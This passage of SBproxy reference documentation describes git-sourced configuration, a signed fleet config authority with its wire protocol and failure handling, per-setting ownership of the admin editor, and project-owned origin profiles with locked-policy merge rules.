`kind: git_overlay` is the alternative when the difference between nodes is structural rather than a handful of scalars. It resolves a base source and then merges ordered overlays on top of it, each of which is itself a source:

```yaml
source:
  kind: git_overlay
  base:
    kind: git
    repo: https://github.com/acme/sbproxy-config.git
    revision: main
    path: fleet/sb.yml
  overlays:
    - kind: git
      repo: https://github.com/acme/sbproxy-config.git
      revision: main
      path: sites/eu-west/sb.yml
```

Overlays merge map by map with the overlay winning, sequences replace wholesale, and the chain is capped at eight levels deep. Every resolved commit contributes to the change detector, so a move in any input triggers one reload of the merged document.

### Three deployment shapes

**1. Standalone GitOps.** A `source:` block and no `proxy.config_authority`. The repository is the whole configuration and the proxy follows it on a timer. No signing infrastructure, no control plane, nothing to run.

```yaml
source:
  kind: git
  repo: https://github.com/acme/sbproxy-config.git
  revision: main
  path: production/sb.yml
```

**2. A git base with a signed authority overlay.** The local file declares a git source and also subscribes to an authority. Resolution order is fixed: the source resolves first and produces the base document, then the authority's signed overlay merges on top, then it compiles. **The authority wins over git**, key by key, because the [deny list](#what-the-subscriber-owns-outright) is what protects the box and the authority is the layer it is enforced against. Git content is operator-owned and therefore unrestricted, which is right: it is equivalent to editing the file by hand.

```yaml
source:
  kind: git
  repo: https://github.com/acme/sbproxy-config.git
  revision: main
  path: production/sb.yml
proxy:
  config_authority:
    upstream:
      url: https://control.example.com:9443
      mode: overlay
      subscriber_id: edge-01
      credential: env:SB_CONFIG_AUTHORITY_TOKEN
      verifying_keys_file: /etc/sbproxy/authority-keys.json
      cache_path: /var/lib/sbproxy/config-bundle.json
```

You keep your own baseline in your repository and central policy still lands on it. Neither layer is locally owned, so a local edit is doomed either way. The merge records where every leaf in the result came from, and that provenance now has three values rather than two: `local`, `git`, and `authority`. A leaf from the git base carries the repository, the reference, and the resolved commit, which is what makes "why is this value here" answerable. An admin surface that serves the provenance map is not part of this version.

When the repository moves, the refresh cycle re-applies the authority overlay it already holds on top of the new base, rather than reloading the repository's document alone. Otherwise there would be a window, one poll interval wide, where the node serves neither layer's answer.

**3. A git-backed authority.** The authority's own published document declares a git source. It resolves that document, then validates, signs, stores, and distributes the *resolved* content. Customers keep configuration in their own repository, and the authority signs and fans it out.

Signing the pointer instead would hand every subscriber a URL to fetch for itself, which is transport trust rather than the signed guarantee that endpoint promises. And because the resolved document is screened like any other payload, a repository whose configuration declares its own `source:` block is refused: `source` is on the deny list, since the authority overlays a base document and does not get to choose where that base comes from.

### Validating a git-sourced config

`sbproxy validate` and `sbproxy plan` resolve the source, so they check the document that would actually boot. Both accept `--no-fetch` to skip resolution, for a machine with no network or no credential for the repository, and both say so on stderr rather than passing silently:

```bash
sbproxy validate /etc/sbproxy/sb.yml
sbproxy validate /etc/sbproxy/sb.yml --no-fetch
# note: '/etc/sbproxy/sb.yml' declares a `source:` block and --no-fetch was
# passed, so only the pointer file was checked. The document this proxy would
# actually serve was not looked at.
```

### Not in this version

No write-back: nothing here commits to a repository. Be aware that on a git-sourced node the admin config editor still writes the local pointer file, which the next refresh then resolves past, so the repository is the only place a configuration change sticks. Making that editor read-only is not part of this version. No `db` source kind, and no submodule or LFS support. Fetch prefers the `git` binary on `PATH` and falls back to an in-process clone when that binary is missing (the official distroless image has neither a shell nor git). `verify_signature: true` still requires `git`, because GPG and SSH signature verification are not in the in-process path.

---

## Config authority (fleet configuration distribution)

Configuration in a file is configuration you have to copy to every box. `proxy.config_authority` replaces the copying: one node signs a configuration and the rest verify it and apply it, through the same reload transaction a SIGHUP takes.

A node takes one of the two roles, never both:

| Block | Role |
|---|---|
| `proxy.config_authority.publish` | **authority**: validates, signs, stores, and serves configuration |
| `proxy.config_authority.upstream` | **subscriber**: polls, verifies, merges, applies |

Setting both is a config error. A node in both roles would republish a document it does not fully own, and the provenance an auditor reads downstream would name that node rather than the authority the values actually came from.

Runnable configs for both halves are in [`examples/config-authority/`](../examples/config-authority/).

### What the subscriber owns outright

No authority can set these paths, in either merge mode:

`proxy.listeners`, `proxy.tls`, `proxy.admin`, `proxy.secrets`, `proxy.cluster`, `proxy.model_host`, `proxy.config_authority`, `proxy.compression_state`, `proxy.config_history`, `source`, `origin_sources`

Presence of one of them anywhere in a payload rejects the whole payload, at publish time on the authority and again at merge time on the subscriber. Not the changed keys, the whole thing: a partial apply of a configuration is a configuration nobody wrote.

The reason is recovery. If a fleet-wide push could rewrite `proxy.admin`, the first bad push would take away the port you would use to undo it. If it could rewrite `proxy.config_authority`, it could point every node at a different authority, permanently. And `proxy.tls` and `proxy.secrets` are per-node material that a central document has no business knowing.

`origin_sources` is the same argument as `source`, one level up. `source` names one repository this node reads its own document from; `origin_sources` names N repositories whose Lua, WASM and JavaScript bodies the `{{ }}` interpolator deliberately never reads, so an authority able to write it would be arbitrary code fetch on every node that trusts it. Its sibling `origin_defaults` is deliberately **not** on this list: that block is the platform raising a security floor across the fleet, which is the one thing this channel exists to distribute. See [Project-owned origin profiles](#project-owned-origin-profiles).

The three before `source` are about local storage and the audit trail. `proxy.compression_state` and `proxy.config_history` both name directories on the node's own disk, which only the process owner can choose. `proxy.config_history` is also the durable record of every configuration this subscriber has applied: an authority that could redirect or disable that ring could cover its own tracks.

### Authority: `proxy.config_authority.publish`

```yaml
proxy:
  admin:
    enabled: true
    bind: 127.0.0.1
    port: 9090
    password: ${ADMIN_PASSWORD}

  config_authority:
    publish:
      authority_id: control-plane-eu
      key_id: authority-2026-07
      signing_key_file: /etc/sbproxy/authority-signing.key
      store_dir: /var/lib/sbproxy/config-authority
      bind: 0.0.0.0:9443
      tls:
        cert_file: /etc/sbproxy/authority.pem
        key_file: /etc/sbproxy/authority-key.pem
      rate_limit_per_subscriber_per_minute: 30
      rate_limit_total_per_minute: 1200
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `authority_id` | string | required | Stamped into every bundle. Subscribers read it as `authority_id`. Letters, digits, and `. - _ :`. |
| `key_id` | string | required | Selects which entry of a subscriber's `verifying_keys_file` verifies the signature. Same character set. |
| `signing_key_file` | path | required | One standard-base64 32-byte Ed25519 seed. Owner-only on unix. |
| `store_dir` | path | required | Holds the durable revision counter, the current and previous signed bundles, and the subscriber registry. |
| `bind` | `host:port` | required | The bundle listener's own address. An IP and a fixed port; a hostname and port `0` are both refused. |
| `tls.cert_file` | path | | PEM certificate chain, leaf first. Required when `bind` is not loopback. |
| `tls.key_file` | path | | PEM private key (PKCS#8 or RSA). Required when `bind` is not loopback. |
| `rate_limit_per_subscriber_per_minute` | int | `30` | Requests one subscriber may make per minute before a `429`. 1 to 1000000; cannot be turned off. |
| `rate_limit_total_per_minute` | int | `1200` | Requests served per minute across the whole fleet before a `429`. Must be at least the per-subscriber cap. |

Two rules refuse a publishing node at startup, both checked by `sbproxy validate`:

- **The shipped default admin password is refused, whatever `bind` says.** On an ordinary node, loopback plus the defaults is the first-run path and guards nothing the local user does not already have. On a publishing node the admin API validates, signs, and publishes the configuration every subscriber then applies, so the blast radius is the fleet rather than the box.
- **A signing key that cannot be loaded is refused.** Missing, oversized, group-readable, or not a 32-byte seed. An authority that cannot sign cannot serve, and finding that out at the first publish attempt means finding it out during a change window.

The bundle listener is separate from the admin listener, and its TLS posture is stricter. `proxy.admin` leaves TLS optional on a remote bind; this listener refuses to start on a non-loopback bind with no `tls` block, and refuses to start when configured TLS material cannot be read. It never falls back to plaintext. Subscribers present a long-lived fleet credential on it and the response body is the whole configuration.

The listener serves exactly one path. `/admin/*`, `/metrics`, and the admin UI are all `404` there, so a subscriber's credential can never reach an operator surface.

### The revision store on disk

```text
<store_dir>/
  authority-state.json      revision counters + subscriber registry
  revisions/current.json    the signed bundle subscribers fetch
  revisions/previous.json   the one before it
```

Every file is written to a temporary name in the same directory, flushed, then renamed over the target, so a crash mid-write leaves the old file or the new one and never a truncated one.

`authority-state.json` carries two counters. `current_revision` is what `revisions/current.json` holds; `high_water_revision` is the highest number ever handed out. The reservation is persisted *before* the bundle is signed, so a crash between the two burns a number rather than reissuing it: a subscriber that has applied revision 8 refuses a later bundle that also calls itself 8 with different content, and it refuses one that calls itself 7 at all. Gaps in the sequence are free; a reused number is not. `high_water_revision` above `current_revision` in the status document is exactly that: a reservation that never published.

The bundle file is written before the state file names it, so the other crash window leaves a bundle nothing points at. That one is repaired at startup rather than refused: the reservation already covered the number, so nothing else can claim it, and the file on disk is the one that was signed. A bundle claiming a number above `high_water_revision`, or a state file naming a bundle that is not there, is refused, because both mean the two files came from different places.

An invalid payload consumes nothing at all, because every validation step runs before the reservation.

The store directory is pinned to its `authority_id`. Pointing a second authority at a directory the first wrote is refused rather than adopted, since the revision counter and the subscriber registry belong to whoever created them.

### Publish validation matches boot

`POST /admin/config-authority/publish` runs the same three steps `sbproxy validate` runs, in the same order: `compile_config`, then the per-origin module constructors, then the model-host desired-state checks.

`compile_config` alone leaves `action`, `policies`, `transforms`, and `authentication` as opaque JSON. A typo inside a policy entry therefore compiles clean, signs clean, and then fails on every subscriber at once, which is a fleet-wide outage caused by a validation gap. Running the constructors is what catches it.

The payload is validated as a configuration in its own right, because that is all the authority can see: under `mode: overlay` the document that actually boots is the payload merged over each subscriber's local file, and the authority does not have those files. So an `${VAR}` the authority cannot resolve is warned about rather than refused, since it may well resolve on the subscriber; if it does not, the subscriber refuses the bundle rather than applying the literal text.

A publish payload is bounded by the admin server's request-body limit (512 KiB) as well as the signed-bundle limit (4 MiB), so the practical ceiling is the smaller of the two.

### Admin routes

All five sit on the admin listener behind operator auth and RBAC.

| Route | Method | Purpose |
|---|---|---|
| `/admin/config-authority/publish` | `POST` | Body is the YAML payload; `?mode=overlay\|replace` selects how subscribers apply it (default `overlay`). |
| `/admin/config-authority/rollback` | `POST` | Republish the previous stored revision's payload. No body, no query. |
| `/admin/config-authority/status` | `GET` | Current revision, digest, ETag, key ID, the verifying-key file to distribute, and per-subscriber last-seen revision. |
| `/admin/config-authority/subscribers` | `GET` / `POST` | List subscribers, or register one with `{"subscriber_id":"edge-01"}`. |
| `/admin/config-authority/subscribers/revoke` | `POST` | `{"credential_id":"..."}` for one credential, `{"subscriber_id":"..."}` for every credential that node holds. |

Operating these from `curl` is possible but nobody should have to.
`sbproxy config authority {init|publish|status|rollback|subscriber}` is the
same surface with local validation, an exit-code contract, and
`--format json`; `sbproxy config pull --dry-run` previews what a
subscriber would apply next without applying it. See
[manual.md](manual.md#config-authority---operate-a-config-authority).

`rollback` republishes the previous payload under a *new* revision number
rather than re-serving the old one. A subscriber's anti-replay cursor
refuses any revision that is not greater than the one it applied, so
re-serving the old number would reach only the nodes that had not yet
taken the revision being undone. The payload is revalidated on the way
through, since a payload that published cleanly before a binary upgrade
need not still construct after one. With nothing to go back to, the route
answers `400` with code `no_previous_revision` and
`"revision_consumed": false`.

Registration returns the clear credential exactly once. The authority stores only a SHA-256 fingerprint of it, so the registry file is not a credential store: someone who reads it cannot authenticate with it. Credentials look like `sbca1.<credential-id>.<secret>` and are long-lived and reusable, unlike the single-use `sbce1` cluster enrollment tokens.

A subscriber may hold several credentials at once, which is how one is rotated without a window where the node cannot fetch: register the new one, deploy it, then revoke the old.

A rejected publish says which step caught it and confirms nothing was spent:

```json
{
  "error": "config authority publish rejected: the payload compiles, but a module failed to construct, so every subscriber would refuse it at boot: ...",
  "code": "construct_failed",
  "revision_consumed": false
}
```

Codes are `invalid_payload`, `denied_path`, `confinement_refused`, `compile_failed`, `construct_failed`, `model_runtime_invalid` (the payload is at fault, `400`), and `signing_failed`, `store_failed`, `internal` (the authority is at fault, `500`, safe to retry).

### The wire contract

Documented so a non-SBproxy server can serve subscribers. One endpoint, one method.

**Request.**

```http
GET /config-authority/v1/bundle HTTP/1.1
Host: control.example.com:9443
Authorization: Bearer sbca1.0lJ8kQ2vTn5mAqRt.9pQx7Yb2ZmKd3Lw8Rn6Tf1Vc4Hs0Jg5Ee2Aa8Bb1Cc
X-Sbproxy-Subscriber-Id: edge-01
If-None-Match: "7-sha256:2c26b46b68ffc68ff99b453c1d3041341340d0d0d0d0d0d0d0d0d0d0d0d0d0d0"
```

`Authorization` is the credential and the identity. `X-Sbproxy-Subscriber-Id` is a claim about it: SBproxy refuses a fetch whose header disagrees with the credential's registered subscriber (`403`), because the last-seen revision the endpoint records is the fleet's rollout evidence and attributing it to the wrong node makes that evidence worse than none. Sending no header at all is fine.

**Response.**

```http
HTTP/1.1 200 OK
Content-Type: application/json
ETag: "8-sha256:fcde2b2edba56bf408601fb721fe9b5c338d10ee429ea04fae5511b68fbf8fb9"
Cache-Control: no-store
Content-Length: 612

{"schema_version":1,"bundle":{"authority_id":"control-plane-eu","revision":8,"mode":"overlay","content_digest":"sha256:fcde2b2edba56bf408601fb721fe9b5c338d10ee429ea04fae5511b68fbf8fb9","config_yaml":"origins:\n  \"edge.example.com\":\n    action:\n      type: proxy\n      url: https://test.sbproxy.dev\n","issued_at_unix_ms":1753401600000,"expires_at_unix_ms":null},"key_id":"authority-2026-07","algorithm":"ed25519","signature":"3p8Q0m...=="}
```

**The ETag format is exact:** `"<revision>-<content_digest>"`, with the double quotes, where `content_digest` is the `sha256:<64 lowercase hex>` of the exact `config_yaml` bytes. Both halves matter. The revision is what the authority compares; the digest is what makes a same-revision content change visible instead of a silent `304`. A subscriber sends back verbatim what it last received.

`If-None-Match` accepts a comma-separated list, `*`, and the weak `W/` prefix, so an ordinary HTTP client library works against this endpoint.

**Statuses.**

| Status | Meaning |
|---|---|
| `200` | A bundle, with its `ETag`. |
| `304` | `If-None-Match` matched the current bundle. No body, no `Content-Length`. |
| `401` | No bearer credential, or one that does not authenticate. |
| `403` | A valid credential that has been revoked, or a subscriber-ID header that disagrees with it. |
| `404` | Nothing published yet, or any path other than the bundle path. |
| `405` | Any method other than `GET`. |
| `429` | Past the per-subscriber or the fleet-wide rate limit. |

A subscriber treats every non-`200`, non-`304` answer as "authority unreachable": it keeps serving the configuration it already applied and retries at the next interval. A revoked credential therefore does not take a node down, it stops it receiving updates.

**The envelope.** `signature` is base64 Ed25519 over `sbproxy.config-bundle.v1`, a single `0x00` byte, then the RFC 8785 (JCS) canonical JSON of the `bundle` object. Canonical JSON means the signature survives any re-serialization that preserves the parsed values, and the domain-separation prefix means a bundle signature can never be replayed as a cluster-state or model-dispatch signature even when one key signs all three. `content_digest` is checked independently of the signature, so a corrupt payload is caught even when the signing key is compromised.

**Key distribution.** Subscribers read trusted keys from a JSON file mapping key ID to material. `GET /admin/config-authority/status` returns exactly this document under `verifying_keys_file`:

```json
{
  "authority-2026-07": {
    "algorithm": "ed25519",
    "key": "3p8Q0mB1yV4kX7wR2tL6nS9cF5jH0dA8gZ2eK4uY1oM="
  },
  "authority-2026-08": {
    "algorithm": "ed25519",
    "key": "9kL2xP7bT4mV1nQ8wR5tY6sF3jH0dA8gZ2eK4uY1oM="
  }
}
```

Rotation is additive: publish under the new `key_id` while subscribers still trust the old one, then drop the old entry a window later. No restart at all, on any node. A subscriber re-reads `verifying_keys_file` on every poll that returns a bundle, so adding an entry starts verifying and removing one stops verifying without the process being touched. That matters most for the removal: a key revoked because it leaked has to stop working when you edit the file, not when you finish restarting the fleet. A read that fails, which is what a file being rewritten looks like for an instant, keeps the key set already loaded rather than trusting nothing, so an ordinary rotation is not a window where every bundle is refused. `hmac_sha256` is also accepted, for a single-operator lab, and refuses to verify unless the subscriber sets `allow_shared_secret_keys: true`; a shared secret is symmetric, so every subscriber holding it can forge a bundle for every other one.

### Subscriber: `proxy.config_authority.upstream`

```yaml
proxy:
  config_authority:
    upstream:
      url: https://control.example.com:9443
      mode: overlay
      subscriber_id: edge-01
      credential: env:SB_CONFIG_AUTHORITY_TOKEN
      verifying_keys_file: /etc/sbproxy/authority-keys.json
      poll_interval: 30s
      cache_path: /var/lib/sbproxy/config-bundle.json
      max_staleness: 24h
      require_bundle_on_boot: false
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `url` | string | required | Absolute base URL of the authority. Must be `https` unless `allow_insecure_http`. No query or fragment; the subscriber appends its own path. |
| `mode` | enum | required | `overlay` merges the bundle over the local document; `replace` makes the bundle the whole document. Required rather than defaulted: the answer decides whether the local file still describes what the node serves. |
| `subscriber_id` | string | required | Sent on every fetch as `x-sbproxy-subscriber-id`. Must match the id the credential was registered under. |
| `credential` | secret ref | | Bearer credential, as `env:NAME`, `${NAME}`, `file:/path`, or `secret://backend/name`. An inline literal is refused: a token in a config file is a token in every copy of that file. |
| `verifying_keys_file` | path | required | JSON file naming every key this subscriber trusts. |
| `poll_interval` | duration | `30s` | 5s to 24h. The real interval carries jitter, so a fleet restarting together does not synchronize onto the authority. |
| `cache_path` | path | required | Where the verified bundle is cached so the node can boot on the last known configuration. The anti-replay cursor is stored beside it as `<cache_path>.cursor`. |
| `max_staleness` | duration | `24h` | How old a cached bundle may be and still be used at boot. At least `poll_interval`, at most 30 days. |
| `require_bundle_on_boot` | bool | `false` under `overlay`, `true` under `replace` | Refuse to start without a usable bundle. An explicit `false` under `replace` is a config error rather than a silently overridden value, because under replace the local document is not a servable configuration. |
| `allow_insecure_http` | bool | `false` | Permit a plaintext `http://` authority URL. Development only: signatures still hold, but the credential and the whole configuration are exposed on the path. |
| `allow_shared_secret_keys` | bool | `false` | Acknowledge that `hmac_sha256` entries may verify bundles. Development only. |

One cycle: conditional `GET`, verify the envelope, merge over the local document, refuse an unresolved `${VAR}`, then apply through the non-blocking reload entry point. A `304` ends the cycle before any compile.

**Boot does no network I/O.** Startup that depends on a remote fetch is startup that hangs when the remote is slow. A node reads its cache and its key file and nothing else, so an empty cache means booting on the local document under `overlay` (with a loud warning) or refusing to start under `replace`. The first poll a few seconds later brings the authority's document in. Seeding `cache_path` with a signed bundle is how a `replace` subscriber comes up the first time.

**Failure behavior.** Every arm leaves the previously applied configuration serving:

| Situation | Behavior |
|---|---|
| Authority unreachable, or any answer other than `200` / `304` | Keep serving the cached bundle. Error log, age gauge climbs. |
| Signature, schema, digest, expiry, declared-mode, or replay refusal | Reject the candidate. |
| Merged document does not compile or cannot be constructed | Reject the candidate. |
| Merged document carries an unresolved `${VAR}` | Reject the candidate, rather than applying the literal text fleet-wide. |
| Bundle names a subscriber-owned path | Reject the whole bundle. |
| Another reload in flight | Skip the cycle and retry at the next interval, rather than queueing behind it. |

A running node past `max_staleness` keeps serving and logs at error level every cycle. The window is a boot-time gate, not a kill switch: a control-plane outage should not take down a data plane that does not depend on it.

**Observability.** `sbproxy_config_bundle_fetch_total{result}` counts one label per cycle (`ok`, `not_modified`, `unreachable`, `verify_failed`, `compile_failed`, `denied_path`, `confinement_refused`, `reload_busy`), `sbproxy_config_bundle_revision` gauges the applied revision, and `sbproxy_config_bundle_age_seconds` gauges the age of the bundle currently serving, measured from local receipt rather than from the authority's `issued_at` so two disagreeing clocks cannot produce an absurd age at exactly the moment someone is trying to work out whether distribution is stuck.

Changing `proxy.config_authority` requires a restart. The block sits on the deny list, so it is also the one thing an authority can never rewrite.

### What is running here, and who owns it

Once configuration can arrive from a repository or an authority, "show me the config" stops having one answer. Three routes give the three different answers, and the difference matters most on the node you are trying to debug.

| Route | Answers |
|---|---|
| `GET /admin/config` | This node's own file, verbatim. On a git-sourced node this may be nothing but the `source:` block that selected the repository. |
| `GET /admin/config/effective` | The document actually running, after the base and any authority overlay are merged, plus which layer set each setting. |
| `GET /admin/config/schema` | The JSON Schema for the config file, generated from the running binary's own types. |

`GET /admin/drift` keeps its existing meaning, which is narrower than it sounds: it compares the **local file** against the content hash captured at the last load. On a git-sourced or authority-managed node it therefore reports drift in the local file only, and a node whose repository moved is not "drifted" by this measure. Use the effective route to see the merged result and `sbproxy_config_bundle_revision` or `sbproxy_config_source_revision_info` to see whether the remote layer is current.

The effective response carries a provenance map from dotted setting path to the layer that set it:

```json
{
  "yaml": "proxy:\n  http_bind_port: 8080\n...",
  "provenance": {
    "proxy.http_bind_port": "local",
    "origins.api.action.url": "authority"
  },
  "layers": {
    "base": {"kind": "git", "repo": "https://git.example.com/fleet.git", "reference": "main", "commit": "3f2a..."},
    "authority": {"authority_id": "control-plane", "revision": 12, "mode": "overlay"}
  },
  "locally_owned": false,
  "locally_owned_leaves": 4,
  "total_leaves": 61
}
```

A git leaf carries the resolved commit rather than the configured reference, because during an incident those are the two things most likely to differ.

### The editor is only live where the node owns its config

`PUT /admin/config` writes the local file. On a node that pulls configuration from anywhere else, some or all of that file is dead text: the next poll re-merges and the edit vanishes with no error. So the write is refused up front, with `409` and the paths at fault:

```json
{
  "error": "this node does not own the edited path: origins.api.action.url",
  "code": "config_not_locally_owned",
  "conflicts": [{"path": "origins.api.action.url", "owner": "authority"}],
  "layers": {"base": {"kind": "local"}, "authority": {"authority_id": "control-plane", "revision": 12, "mode": "overlay"}},
  "remedy": "authority control-plane owns these paths at revision 12; publish the change through the authority with `sbproxy authority publish`"
}
```

The rule is per-setting rather than per-node, and it is derived from the merge rather than from a list:

| Node shape | Writes |
|---|---|
| Local file only | Unchanged. Everything is editable. |
| Authority in `overlay` mode | Settings the authority does not set are editable. Settings it does set are refused. Adding a setting the authority has never mentioned is allowed. |
| Authority in `replace` mode | Refused, except the subscriber-owned paths above. Those are grafted back from the local file on every merge, so an operator can still change their own admin listener, TLS material, and secrets on a centrally managed node. |
| `source:` resolving to git | Refused. The repository is the configuration; the error names the repo, the reference, and the resolved commit. |
| Git base with an authority overlay | Refused, for both reasons. |

An authority that is configured but has not yet been reached counts as not locally owned. The next poll can claim any path, so treating the file as authoritative in that window would be a promise the node cannot keep.

The refusal is enforced on the server, not in the browser. The admin console greys the editor out and says why, but the same write from `curl` gets the same `409`, and refusals are recorded in the audit log alongside the writes that land.

Two notes on `mode: replace`. The response is a re-serialization, so comments and key order in the local file are not preserved in the effective document (they were already lost in any config with a `features:` block, which is migrated through a full YAML round-trip). And a setting the authority's document simply omits is reported with owner `suppressed` rather than a layer name: under replace it is discarded rather than overwritten, which is the same outcome for whoever was trying to set it.

---

## Project-owned origin profiles

Let a project repository commit the part of the proxy config it actually knows about, and let the platform keep the part it knows about, without either side being able to author a whole origin alone.

`origins:` is a map keyed by hostname. A project repository that wants to ship its own action and its own policies has to author the map key, and the map key is the one thing it does not know: a hostname is an environment fact, and the same service answers on a different one in staging. So a project commits a hostless **origin profile**, and the runtime config supplies the hostname.

Two blocks in the runtime config drive it:

| Block | Owner | What it holds |
|---|---|---|
| `origin_defaults` | platform team | what an origin is before any project has an opinion about it |
| `origin_sources` | platform team | which project repositories to pull, and what hosts each answers on |

Composition runs in one aggregator, not on every node. The aggregator resolves each entry, composes, and publishes the result through the [config authority](#config-authority-fleet-configuration-distribution). A node keeps the subscriber it already has: it receives an ordinary signed bundle and never clones a project repository.

A runnable pair is in [examples/origin-profiles](https://github.com/soapbucket/sbproxy/tree/main/examples/origin-profiles).

### `origin_defaults`

The same shape as one entry under `origins:`, minus the hostname.

```yaml
origin_defaults:
  policies:
    - name: platform_waf
      type: waf
      owasp_crs:
        enabled: true
        managed_bundle: true
      action_on_match: block
      locked: true
    - name: rate_limit
      type: rate_limiting
      requests_per_minute: 600
      burst: 100
  request_modifiers:
    - name: platform_headers
      headers:
        set:
          X-Served-By: sbproxy
```

Every entry under `policies`, `transforms`, `request_modifiers` and `response_modifiers` must carry a `name:`. A default has to be addressable to be overridable, and an unnamed one fails at config load rather than at the first composition.

`locked: true` on an entry refuses a project override, and also refuses a project addition that would shadow that entry's effect. A lock binds what an entry does, not what it is called; see [List merge by name](#list-merge-by-name).

Three things about this block are checked at config load rather than at the aggregator, because neither this block nor an entry's `overrides:` carries `deny_unknown_fields` (the merge runs before the typed parse, and the typed modifier structs reject the `name:` key the merge is keyed on). Every top-level key must be a real origin field, every list entry must carry a `name:`, and every `policies:` and `transforms:` entry must name a `type:` some module answers to. A misspelling in any of the three used to pass `sbproxy validate` clean and then fail every compose at the far end of a GitOps loop.

A `type:` is required in `origin_defaults` and optional in an entry's `overrides:`, because a named override is usually a partial edit of a floor entry that already carries one. And "some module answers to" is read off the built-in list, which is not the whole vocabulary: an installed extension bundle provides types that are by construction absent from it. Config load cannot resolve the installed set, because bundle sources are paths and URLs it deliberately does not fetch, so the question it asks instead is whether this document declares any bundle source at all. A document with none is refused for an unrecognized type, since it has no way to acquire one; a document with one warns and lets the composed origin meet the real dispatcher at boot.

This block is authority-writable. The platform raising a security floor across the fleet is exactly what that channel exists for.

### `origin_sources`

```yaml
origin_sources:
  tier: production
  entries:
    - name: checkout
      repo: https://git.example.com/acme/checkout
      revision: refs/tags/v1.4.2
      path: sbproxy/origin.yaml
      credential: secret://ci/github-token
      verify_signature: true
      timeout_secs: 30
      environment: prod
      hosts:
        api:
          - checkout.example.com
        webhooks:
          - hooks.example.com
      inputs:
        upstream_key: secret://prod/checkout-upstream-key
        region: us-east-1
      overrides:
        policies:
          - name: rate_limit
            requests_per_minute: 5000
```

| Key | Type | Default | Description |
|---|---|---|---|
| `tier` | enum | `development` | `development` or `production`. In `production` every entry must pin an immutable revision. A property of this document, never of an entry. |
| `entries[].name` | string | required | Stable name, unique within the block. Every refusal names it. |
| `entries[].repo` | string | required | Repository URL, in any form `git clone` accepts. |
| `entries[].revision` | string | none | Branch, tag, or full commit sha. Absent follows the default branch, which the `production` tier refuses. |
| `entries[].path` | string | required | Path to the profile inside the repository, relative to its root. Conventionally `sbproxy/origin.yaml`. |
| `entries[].credential` | string | none | Reference for a private repository: `env:NAME`, `${NAME}`, `file:/path`, or `secret://backend/name`. An inline literal is refused. |
| `entries[].verify_signature` | bool | `false` | Require a valid signature on the resolved tag or commit. |
| `entries[].timeout_secs` | int | `60` | Hard timeout for one fetch. `0` is refused. |
| `entries[].environment` | string | none | Which `environments:` layer of the profile applies. Selects a layer and grants nothing. |
| `entries[].hosts` | map | `{}` | Hosts each declared profile origin answers on, keyed by profile origin name. |
| `entries[].inputs` | map | `{}` | Values for the inputs the profile declares. |
| `entries[].overrides` | map | none | The runtime's last word, layered after everything the project wrote. |

The git fields are the `source:` block's field set rather than a narrower struct of their own. Omitting `credential` would mean no private project repositories, omitting `verify_signature` would take away the check the pinning trust story leans on, and omitting `timeout_secs` would mean one unreachable project repository can hold a compose open. Two `source:` fields are deliberately absent: `refresh_interval_secs` belongs to the aggregator rather than to one entry, and `confine` is absent because a project profile is always confined.

`origin_sources` is **not** authority-writable. It is on the subscriber's denied-path list alongside `source`, and for the same reason one level up: `source` names one repository, while this block names N of them, and the documents it pulls carry Lua, WASM and JavaScript bodies the `{{ }}` interpolator deliberately never reads. An authority able to write it would be arbitrary code fetch on every node that trusts it.

### The profile a project commits

```yaml
# sbproxy/origin.yaml in the project's own repository
name: checkout

inputs:
  - name: upstream_host
    description: the regional upstream this deployment sends to
  - name: shop_origin
    description: browser origin allowed to call this service
    default: https://shop.example.com

spec:
  api:
    base:
      action:
        type: proxy
        url: "https://{{vars.upstream_host}}"
        preserve_query: true
      policies:
        - name: rate_limit
          requests_per_minute: 1200
      cors:
        allowed_origins:
          - "{{vars.shop_origin}}"
    environments:
      prod:
        action:
          host_override: checkout.internal.example.com
  webhooks:
    base:
      action:
        type: proxy
        url: https://checkout-hooks.internal.example.com
```

`spec` is a map of profile origin name to that origin's layers, so one profile can declare an API host and a webhook host at once. The entry's `hosts:` binds each name to real hostnames.

A declared input with neither a bound value nor a default is a resolve error naming both the input and the entry. It is never a warning and never a literal passthrough. An entry that binds a name the profile does not declare is refused too, with the message listing what the profile does declare.

An input binds as text. A typed knob belongs in the entry's `overrides:` block, which is runtime YAML and is never substituted.

### Layering

Later layers win, and the runtime bookends the stack:

1. `origin_defaults`
2. `spec.<origin>.base`
3. `spec.<origin>.environments.<env>`, selected by the entry's `environment:`
4. `overrides:` on the source entry

### List merge by name

`policies`, `transforms`, `request_modifiers` and `response_modifiers` merge entry by entry against a `name:` key. Every other sequence replaces wholesale, matching the rest of the config merge, because element identity in a generic YAML list is not knowable.

| Situation | Result |
|---|---|
| name in the floor, absent from the project | the floor entry survives unchanged |
| name in both | field-level merge; the project wins per field |
| name only in the project | appended after the floor, in project order |
| name in the floor with `locked: true`, project touches it | refused, naming the policy, the profile and the entry |
| project adds an entry that would shadow a locked one | refused, naming the lock, the addition and the effect they share |
| project sets `disabled: true` on an unlocked floor entry | dropped, and the drop is recorded |
| unnamed entry in `origin_defaults` | refused at config load |
| unnamed entry in a project profile | always an addition, appended |

There is no delete verb. `disabled: true` leaves a record; an absence does not. `policies: []` in a project profile therefore leaves the floor intact, which is the scenario the whole floor concept exists to prevent.

`name`, `locked` and `disabled` are stripped before the composed origin is emitted, because the modules those lists feed reject unknown keys.

`locked:` protects the floor from the project, not from the platform that wrote it. The entry's `overrides:` block passes straight through a lock. A project that sets `locked:` itself is refused: locking is the runtime config's verb.

A lock binds what an entry does, not what it is called. Refusing only a same-name override would leave the project one rename away from the thing the lock exists to stop: every project addition lands after the floor, and for anything last-write-wins the later entry simply wins. So a project layer is refused in three places:

- **An addition that shares an effect with a locked entry.** "Effect" is the `type:` for a `policies:` or `transforms:` entry, and the set of leaf paths written for a modifier, compared case-insensitively. A floor that locks `response_modifiers[].headers.set.Content-Security-Policy` refuses a project entry that *declares* that header under any name and in any case.
- **A script body brought into a modifier list that holds a lock, by an addition or by an override.** `lua_script`, `js_script`, `rego_module` and `rego_module_path` all return `set_headers`, and what they set is inside a string, so the effect comparison cannot read it. Rather than promise a boundary it cannot hold, the composition refuses the project layer outright while any entry in that list is locked. Both arms, because an override reaches the same place an addition does with a rename saved: merging a `lua_script` onto an unlocked entry that already sits after the lock would otherwise land, since the comparison sees the key and not what it writes. The check reads the incoming layer's entry rather than the merged result, so a floor entry that already carries a script of its own is not retroactively refused by a project layer editing some other field of it. This is why the bullet above says "declares": a locked header is safe from a declarative project entry by comparison, and safe from a project script by refusal.
